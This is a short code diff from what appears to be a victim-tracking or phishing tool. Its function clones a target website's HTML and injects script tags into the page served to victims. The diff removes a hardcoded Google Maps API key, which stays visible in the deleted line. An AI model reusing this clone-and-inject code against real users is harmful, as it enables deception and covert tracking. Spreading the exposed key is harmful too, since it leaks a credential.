@@ -75,7 +75,7 @@ def victim_headers(ua):
             ]
 
 
-def victim_inject_code(html, script='a', url_to_clone='', gMapsApiKey='AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM', IpInfoApiKey=''):
+def victim_inject_code(html, script='a', url_to_clone=''):
     url_to_clone = str(url_to_clone)
     html = html.replace('src="'.encode(), str('src="' + url_to_clone + '/').encode())
     html = html.replace("src='".encode(), str("src='" + url_to_clone + '/').encode())
@@ -87,8 +87,6 @@ def victim_inject_code(html, script='a', url_to_clone='', gMapsApiKey='AIzaSyBUP
     html = html.replace(str("href='" + url_to_clone + '/' + 'http').encode(), "href='http".encode())
     html = html.replace(
         '</head>'.encode(), '<script type="text/javascript" src="/static/js/libs.min.js"></script></head>'.encode())
-    html = html.replace('</head>'.encode(), str('<script type="text/javascript">window.gMapsApiKey="' + str(
-        gMapsApiKey) + '"; window.IpInfoApiKey="' + str(IpInfoApiKey) + '";</script></head>').encode())
     html = html.replace(
         '</head>'.encode(), '<script type="text/javascript" src="/static/js/base.js"></script></head>'.encode())
     html = html.replace(
